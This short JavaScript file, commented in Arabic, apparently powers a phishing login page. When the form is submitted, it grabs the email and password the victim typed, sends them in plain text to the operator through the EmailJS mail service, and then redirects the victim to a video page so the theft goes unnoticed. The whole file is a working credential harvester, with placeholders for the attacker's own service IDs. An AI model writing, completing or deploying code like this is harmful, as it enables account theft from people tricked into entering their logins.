document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();
    
    // الحصول على البيانات المدخلة
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    // تهيئة خدمة EmailJS (تأكد من أنك استبدلت هذه القيم بقيمك الخاصة)
    emailjs.init("YOUR_USER_ID"); // ضع معرف المستخدم الخاص بك من EmailJS

    // إرسال البيانات إلى البريد الإلكتروني باستخدام EmailJS
    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
        email: email,
        password: password
    }).then(function(response) {
        console.log("تم إرسال البريد بنجاح: ", response);
        window.location.href = "video.html"; // توجيه المستخدم بعد إرسال البيانات
    }, function(error) {
        console.error("فشل إرسال البريد: ", error);
        alert("حدث خطأ أثناء إرسال البيانات.");
    });
});
